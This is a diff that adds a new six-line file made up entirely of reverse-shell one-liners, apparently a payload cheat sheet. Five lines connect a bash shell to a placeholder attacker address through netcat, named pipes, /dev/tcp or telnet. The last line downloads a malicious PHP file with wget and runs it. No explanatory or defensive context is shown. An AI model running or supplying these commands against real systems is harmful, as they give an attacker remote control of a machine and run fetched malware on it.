@@ -1,0 +1,6 @@
+nc <attacker_ip> <port> -e /bin/bash
+mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
+/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
+mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
+telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>
+wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php
